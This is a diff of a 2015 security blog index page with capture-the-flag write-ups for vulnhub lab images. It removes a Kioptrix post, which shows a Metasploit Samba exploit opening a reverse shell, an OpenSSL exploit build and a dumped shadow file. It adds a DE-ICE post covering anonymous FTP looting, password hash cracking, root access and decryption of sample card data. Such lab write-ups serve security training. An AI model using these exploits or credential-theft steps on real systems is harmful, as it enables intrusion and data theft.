@@ -9,7 +9,7 @@
   <meta name="author" content="Norbert Szetei">
 
   
-  <meta name="description" content="Image: Kioptrix: Level 1 (#1) Nmap output: 1
+  <meta name="description" content="Image: pWnOS: 1.0 Nmap output: 1
 2
 3
 4
@@ -17,7 +17,7 @@
 6
 7
 PORT STATE SERVICE VERSION
-22/tcp open ssh OpenSSH 2.9p2 (protocol 1.99)
+22/tcp open ssh OpenSSH 4.6p1 Debian 5build1 (protocol 2.0)
 80/tcp open http &hellip;">
   
 
@@ -87,247 +87,6 @@ PORT STATE SERVICE VERSION
     <div id="content">
       <div class="blog-index">
   
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2015/05/10/kioptrix-level-1/">Kioptrix: Level 1</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2015-05-10T13:34:07+02:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>10</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>1:34 pm</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>Image: <a href="https://www.vulnhub.com/entry/kioptrix-level-1-1,22/">Kioptrix: Level 1 (#1)</a></p>
-
-<p>Nmap output:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>PORT     STATE SERVICE     VERSION
-</span><span class='line'>22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
-</span><span class='line'>80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
-</span><span class='line'>111/tcp  open  rpcbind     2 (RPC #100000)
-</span><span class='line'>139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)
-</span><span class='line'>443/tcp  open  ssl/http    Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
-</span><span class='line'>1024/tcp open  status      1 (RPC #100024)</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Enumeration of Samba:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/usr/share/exploitdb# nmblookup -A 192.168.0.26
-</span><span class='line'>Looking up status of 192.168.0.26
-</span><span class='line'>        KIOPTRIX        &lt;00> -         B &lt;ACTIVE> 
-</span><span class='line'>        KIOPTRIX        &lt;03> -         B &lt;ACTIVE> 
-</span><span class='line'>        KIOPTRIX        &lt;20> -         B &lt;ACTIVE> 
-</span><span class='line'>        ..__MSBROWSE__. &lt;01> - &lt;GROUP> B &lt;ACTIVE> 
-</span><span class='line'>        MYGROUP         &lt;00> - &lt;GROUP> B &lt;ACTIVE> 
-</span><span class='line'>        MYGROUP         &lt;1d> -         B &lt;ACTIVE> 
-</span><span class='line'>        MYGROUP         &lt;1e> - &lt;GROUP> B &lt;ACTIVE> 
-</span><span class='line'>
-</span><span class='line'>        MAC Address = 00-00-00-00-00-00
-</span><span class='line'>
-</span><span class='line'>root@kali32:/usr/share/exploitdb# smbclient -L\\ -I 192.168.0.26
-</span><span class='line'>Enter root's password: 
-</span><span class='line'>Anonymous login successful
-</span><span class='line'>Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]
-</span><span class='line'>
-</span><span class='line'>        Sharename       Type      Comment
-</span><span class='line'>        ---------       ----      -------
-</span><span class='line'>        IPC$            IPC       IPC Service (Samba Server)
-</span><span class='line'>        ADMIN$          IPC       IPC Service (Samba Server)
-</span><span class='line'>Anonymous login successful
-</span><span class='line'>Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]
-</span><span class='line'>
-</span><span class='line'>        Server               Comment
-</span><span class='line'>        ---------            -------
-</span><span class='line'>        KIOPTRIX             Samba Server
-</span><span class='line'>
-</span><span class='line'>        Workgroup            Master
-</span><span class='line'>        ---------            -------
-</span><span class='line'>        MYGROUP              KIOPTRIX</span></code></pre></td></tr></table></div></figure>
-
-
-<p>The service is running with the root privileges and we can use exploit in Metasploit to obtain root account:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>msf > use exploit/linux/samba/trans2open
-</span><span class='line'>msf exploit(trans2open) > setg RHOST 192.168.80.141
-</span><span class='line'>RHOST => 192.168.80.141
-</span><span class='line'>msf exploit(trans2open) > exploit
-</span><span class='line'>
-</span><span class='line'>[*] Started reverse handler on 192.168.80.137:4444
-</span><span class='line'>[*] Trying return address 0xbffffdfc...
-</span><span class='line'>[*] Trying return address 0xbffffcfc...
-</span><span class='line'>[*] Trying return address 0xbffffbfc...
-</span><span class='line'>[*] Trying return address 0xbffffafc...
-</span><span class='line'>[*] Command shell session 1 opened (192.168.80.137:4444 -> 192.168.80.141:1026) at 2015-04-27 06:43:53 +0200</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Because Apache is vulnerable, there is another solution. Nikto reports something interesting:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. CVE-2002-0082, OSVDB-756.</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Web server signature:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</span></code></pre></td></tr></table></div></figure>
-
-
-<p>In exploitdb we find:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>Apache OpenSSL - Remote Exploit (Multiple Targets) (OpenFuckV2.c) | /linux/remote/764.c</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Because the exploit is pretty old, we need to update it with these <a href="https://paulsec.github.io/blog/2014/04/14/updating-openfuck-exploit/">steps</a>:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>#include &lt;openssl/rc4.h>
-</span><span class='line'>#include &lt;openssl/md5.h>
-</span><span class='line'>...
-</span><span class='line'>http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
-</span><span class='line'>...
-</span><span class='line'># gcc -o OpenFuck 764.c -lcrypto</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Finally we run the exploit and cat /etc/shadow with the root privileges.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>cat /etc/shadow
-</span><span class='line'>root:$1$XROmcfDX$tF93GqnLHOJeGRHpaNyIs0:14513:0:99999:7:::
-</span><span class='line'>bin:*:14513:0:99999:7:::
-</span><span class='line'>daemon:*:14513:0:99999:7:::
-</span><span class='line'>adm:*:14513:0:99999:7:::
-</span><span class='line'>lp:*:14513:0:99999:7:::
-</span><span class='line'>sync:*:14513:0:99999:7:::
-</span><span class='line'>shutdown:*:14513:0:99999:7:::
-</span><span class='line'>halt:*:14513:0:99999:7:::
-</span><span class='line'>mail:*:14513:0:99999:7:::
-</span><span class='line'>news:*:14513:0:99999:7:::
-</span><span class='line'>uucp:*:14513:0:99999:7:::
-</span><span class='line'>operator:*:14513:0:99999:7:::
-</span><span class='line'>games:*:14513:0:99999:7:::
-</span><span class='line'>gopher:*:14513:0:99999:7:::
-</span><span class='line'>ftp:*:14513:0:99999:7:::
-</span><span class='line'>nobody:*:14513:0:99999:7:::
-</span><span class='line'>mailnull:!!:14513:0:99999:7:::
-</span><span class='line'>rpm:!!:14513:0:99999:7:::
-</span><span class='line'>xfs:!!:14513:0:99999:7:::
-</span><span class='line'>rpc:!!:14513:0:99999:7:::
-</span><span class='line'>rpcuser:!!:14513:0:99999:7:::
-</span><span class='line'>nfsnobody:!!:14513:0:99999:7:::
-</span><span class='line'>nscd:!!:14513:0:99999:7:::
-</span><span class='line'>ident:!!:14513:0:99999:7:::
-</span><span class='line'>radvd:!!:14513:0:99999:7:::
-</span><span class='line'>postgres:!!:14513:0:99999:7:::
-</span><span class='line'>apache:!!:14513:0:99999:7:::
-</span><span class='line'>squid:!!:14513:0:99999:7:::
-</span><span class='line'>pcap:!!:14513:0:99999:7:::
-</span><span class='line'>john:$1$zL4.MR4t$26N4YpTGceBO0gTX6TAky1:14513:0:99999:7:::
-</span><span class='line'>harold:$1$Xx6dZdOd$IMOGACl3r757dv17LZ9010:14513:0:99999:7:::</span></code></pre></td></tr></table></div></figure>
-
-</div>
-  
-  
-
-
-    </article>
   
   
     <article>
@@ -1154,6 +913,250 @@ pirrip user:</p>
 </span><span class='line'>Philip Pirrip:  734-67-0424 5.5% $74,224
 </span><span class='line'>Abel Magwitch:  816-03-0028 4.0% $53,122
 </span><span class='line'>Estella Havisham: 762-93-1073 12% $84,325</span></code></pre></td></tr></table></div></figure>
+
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/05/10/de-ice-s1-dot-110/">DE-ICE-S1.110</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-05-10T00:01:04+02:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>10</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>12:01 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Image: <a href="https://www.vulnhub.com/entry/de-ice-s1110,9/">De-ICE: S1.110</a></p>
+
+<p>Nmap output:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>21/tcp  open     ftp     vsftpd 2.0.4
+</span><span class='line'>22/tcp  filtered ssh 
+</span><span class='line'>80/tcp  open     http    Apache httpd 2.2.4 ((Unix) mod_ssl/2.2.4 OpenSSL/0.9.8b DAV/2)
+</span><span class='line'>631/tcp open     ipp     CUPS 1.1</span></code></pre></td></tr></table></div></figure>
+
+
+<p>FTP anonymous login is allowed:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>wget -r ftp://ftp@192.168.1.110:</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We have found a few files, but nothing particularly interesting:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/DE-ICE-S1.110/192.168.1.110/download# cat ./opt/cygwin/etc/passwd
+</span><span class='line'>SYSTEM:*:18:544:,S-1-5-18::
+</span><span class='line'>Administrators:*:544:544:,S-1-5-32-544::
+</span><span class='line'>Administrator:unused_by_nt/2000/xp:500:513:U-Tom-PC\Administrator,S-1-5-21-1894367954-3740816113-1455894701-500:/home/Administrator:/bin/bash
+</span><span class='line'>Guest:unused_by_nt/2000/xp:501:513:U-Tom-PC\Guest,S-1-5-21-1894367954-3740816113-1455894701-501:/home/Guest:/bin/bash
+</span><span class='line'>Tom:unused_by_nt/2000/xp:1000:513:U-Tom-PC\Tom,S-1-5-21-1894367954-3740816113-1455894701-1000:/home/Tom:/bin/bash
+</span><span class='line'>__vmware_user__:unused_by_nt/2000/xp:1002:513:__vmware_user__,U-Tom-PC\__vmware_user__,S-1-5-21-1894367954-3740816113-1455894701-1002:/home/__vmware_user__:/bin/bash
+</span><span class='line'>
+</span><span class='line'>root@kali:~/DE-ICE-S1.110# cat 192.168.1.110/download/etc/shadow
+</span><span class='line'>root:$1$3OF/pWTC$lvhdyl86pAEQcrvepWqpu.:12859:0:::::
+</span><span class='line'>bin:*:9797:0:::::
+</span><span class='line'>daemon:*:9797:0:::::
+</span><span class='line'>adm:*:9797:0:::::
+</span><span class='line'>lp:*:9797:0:::::
+</span><span class='line'>sync:*:9797:0:::::
+</span><span class='line'>shutdown:*:9797:0:::::
+</span><span class='line'>halt:*:9797:0:::::
+</span><span class='line'>mail:*:9797:0:::::
+</span><span class='line'>news:*:9797:0:::::
+</span><span class='line'>uucp:*:9797:0:::::
+</span><span class='line'>operator:*:9797:0:::::
+</span><span class='line'>games:*:9797:0:::::
+</span><span class='line'>ftp:*:9797:0:::::
+</span><span class='line'>smmsp:*:9797:0:::::
+</span><span class='line'>mysql:*:9797:0:::::
+</span><span class='line'>rpc:*:9797:0:::::
+</span><span class='line'>sshd:*:9797:0:::::
+</span><span class='line'>gdm:*:9797:0:::::
+</span><span class='line'>pop:*:9797:0:::::
+</span><span class='line'>nobody:*:9797:0:::::
+</span><span class='line'>
+</span><span class='line'>toor             (root)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>More about cygwin format <a href="https://cygwin.com/cygwin-ug-net/ntsec.html">here</a>.</p>
+
+<p>In /etc directory, there is a core file which contains password hashes:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/DE-ICE-S1.110/192.168.1.110/download/etc# strings core | tail -1
+</span><span class='line'>root:$1$aQo/FOTu$rriwTq.pGmN3OhFe75yd30:13574:0:::::bin:*:9797:0:::::daemon:*:9797:0:::::adm:*:9797:0:::::lp:*:9797:0:::::sync:*:9797:0:::::shutdown:*:9797:0:::::halt:*:9797:0:::::mail:*:9797:0:::::news:*:9797:0:::::uucp:*:9797:0:::::operator:*:9797:0:::::games:*:9797:0:::::ftp:*:9797:0:::::smmsp:*:9797:0:::::mysql:*:9797:0:::::rpc:*:9797:0:::::sshd:*:9797:0:::::gdm:*:9797:0:::::pop:*:9797:0:::::nobody:*:9797:0:::::aadams:$1$klZ09iws$fQDiqXfQXBErilgdRyogn.:13570:0:99999:7:::bbanter:$1$1wY0b2Bt$Q6cLev2TG9eH9iIaTuFKy1:13571:0:99999:7:::ccoffee:$1$6yf/SuEu$EZ1TWxFMHE0pDXCCMQu70/:13574:0:99999:7:::</span></code></pre></td></tr></table></div></figure>
+
+
+<p>After adjusting:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root:$1$aQo/FOTu$rriwTq.pGmN3OhFe75yd30:13574:0:::::
+</span><span class='line'>bin:*:9797:0:::::
+</span><span class='line'>daemon:*:9797:0:::::
+</span><span class='line'>adm:*:9797:0:::::
+</span><span class='line'>lp:*:9797:0:::::
+</span><span class='line'>sync:*:9797:0:::::
+</span><span class='line'>shutdown:*:9797:0:::::
+</span><span class='line'>halt:*:9797:0:::::
+</span><span class='line'>mail:*:9797:0:::::
+</span><span class='line'>news:*:9797:0:::::
+</span><span class='line'>uucp:*:9797:0:::::
+</span><span class='line'>operator:*:9797:0:::::
+</span><span class='line'>games:*:9797:0:::::
+</span><span class='line'>ftp:*:9797:0:::::
+</span><span class='line'>smmsp:*:9797:0:::::
+</span><span class='line'>mysql:*:9797:0:::::
+</span><span class='line'>rpc:*:9797:0:::::
+</span><span class='line'>sshd:*:9797:0:::::
+</span><span class='line'>gdm:*:9797:0:::::
+</span><span class='line'>pop:*:9797:0:::::
+</span><span class='line'>nobody:*:9797:0:::::
+</span><span class='line'>aadams:$1$klZ09iws$fQDiqXfQXBErilgdRyogn.:13570:0:99999:7:::
+</span><span class='line'>bbanter:$1$1wY0b2Bt$Q6cLev2TG9eH9iIaTuFKy1:13571:0:99999:7:::
+</span><span class='line'>ccoffee:$1$6yf/SuEu$EZ1TWxFMHE0pDXCCMQu70/:13574:0:99999:7:::</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ john ~/DE-ICE-S1.110/crackme.john --wordlist="/root/darkc0de.lst"
+</span><span class='line'>Complexity       (root)
+</span><span class='line'>Zymurgy          (bbanter)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We log in as user bbanter and obtain root permissions:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>bbanter@slax:/$ su root
+</span><span class='line'>Password: **********
+</span><span class='line'>root@slax:/# id
+</span><span class='line'>uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Lastly, we check the backup file and decrypt CSV:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@slax:/home/root/.save# cat copy.sh
+</span><span class='line'><span class="c">#!/bin/sh</span>
+</span><span class='line'><span class="c">#encrypt files in ftp/incoming</span>
+</span><span class='line'>openssl enc -aes-256-cbc -salt -in /home/ftp/incoming/<span class="nv">$1</span> -out /home/root/.save/<span class="nv">$1</span>.enc -pass file:/etc/ssl/certs/pw
+</span><span class='line'><span class="c">#remove old file</span>
+</span><span class='line'>rm /home/ftp/incoming/<span class="nv">$1</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@slax:/home/root/.save# cat /etc/ssl/certs/pw
+</span><span class='line'>d2Ews4TgaQm72C0nr5t5U9noRfdllV62speWeC410il1lfd3Cxe2RqSx5o0Of</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@slax:/home/root/.save# openssl enc -aes-256-cbc -d -in customer_account.csv.enc -pass file:/etc/ssl/certs/pw
+</span><span class='line'>"CustomerID","CustomerName","CCType","AccountNo","ExpDate","DelMethod"
+</span><span class='line'>1002,"Mozart Exercise Balls Corp.","VISA","2412225132153211","11/09","SHIP"
+</span><span class='line'>1003,"Brahms 4-Hands Pianos","MC","3513151542522415","07/08","SHIP"
+</span><span class='line'>1004,"Strauss Blue River Drinks","MC","2514351522413214","02/08","PICKUP"
+</span><span class='line'>1005,"Beethoven Hearing-Aid Corp.","VISA","5126391235199246","09/09","SHIP"
+</span><span class='line'>1006,"Mendelssohn Wedding Dresses","MC","6147032541326464","01/10","PICKUP"
+</span><span class='line'>1007,"Tchaikovsky Nut Importer and Supplies","VISA","4123214145321524","05/08","SHIP"</span></code></pre></td></tr></table></div></figure>
 
 </div>
   
